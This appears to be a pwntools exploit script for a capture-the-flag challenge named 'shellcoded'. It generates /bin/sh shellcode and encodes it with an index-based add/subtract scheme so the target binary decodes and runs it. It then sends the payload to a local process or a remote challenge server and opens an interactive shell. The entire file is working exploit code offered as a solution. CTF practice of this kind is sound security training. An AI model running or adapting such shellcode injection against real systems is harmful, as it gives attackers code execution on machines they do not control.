#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellcoded')

if args.REMOTE:
	p = remote('challenge.ctf.games', 31416)
else:
	p = process(binary.path)

shellcode = asm(shellcraft.sh())
shellcoded = [ x & 0xff for x in [ shellcode[i] + i if i & 1 else shellcode[i] - i for i in range(len(shellcode)) ]]

p.sendlineafter(b'shellcode.\n',bytearray(shellcoded))
p.interactive()
